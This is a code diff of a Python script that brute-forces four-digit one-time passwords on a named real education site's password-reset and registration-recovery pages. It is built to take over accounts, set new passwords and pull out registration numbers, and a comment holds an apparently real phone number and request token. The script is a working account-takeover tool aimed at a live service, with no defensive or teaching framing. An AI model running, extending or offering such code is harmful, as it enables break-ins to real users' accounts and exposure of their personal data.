@@ -1,5 +1,6 @@
 import requests as r
 from time import sleep
+from bs4 import BeautifulSoup
 
 session = r.Session()
 url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
@@ -10,10 +11,7 @@ token = cookie[0:index]
 
 
 data = {
-        "__RequestVerificationToken=": token[27:],
-        "RegistrationNumber": "",
-        "mobileNumber": "",
-        "otp": "" 
+        "__RequestVerificationToken=": token[27:] 
     }
 
 class ChangePassword:
@@ -43,7 +41,7 @@ class ChangePassword:
                 print(data["otp"])
                 otp_res = session.post(otp_url,data=data)
                 if "Password length must be greater than or equal to 6" in otp_res.text:
-                    print("Cracked!")
+                    print("Cracked!!")
                     break
            
                
@@ -58,3 +56,33 @@ class ChangePassword:
             print("New password:",password)
         else:
             print(pass_res)
+
+
+#https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber?__RequestVerificationToken=sl9KQLE6eeNfrdaRZrh1dAjpD0-hA0chPyiDrEyyN8ViRuu66_YzFbM7Wb6HxRrpJXkEAe3SJ2nF1ipOlKcz8eAzYK36E6b-z7iB2tnnkhU1&mobileNumber=8801756750513&nickName=Doha
+class getRegNumber:
+    def __init__(self,phone,nickName):
+        self.phoneNumber = phone
+        self.nickName = nickName
+
+
+    def req_otp(self):
+        otp_url = f"https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber?{token}&mobileNumber={self.phoneNumber}&nickName={self.nickName}"
+        session.get(otp_url)
+        print("OTP sent!")
+    
+    def crack_otp(self):
+        data["nickName"] = self.nickName
+        data["mobileNumber"] = self.phoneNumber
+        otp_url = "https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber"
+        with open("4digits.txt") as file:
+            for otp in file:
+                data["otp"] = otp[0:4]
+                print(data["otp"])
+                otp_res = session.post(otp_url,data = data)
+                if "Your registration number" in otp_res.text:
+                    print("Cracked!!")
+                    soup = BeautifulSoup(otp_res.content, 'html.parser')
+                    h3_tag = soup.find('h3', {'class': 'uu-login-form-sub-title'})
+                    span_tag = h3_tag.find('span')
+                    print(f"The registration number is:{span_tag.text}")
+                    break
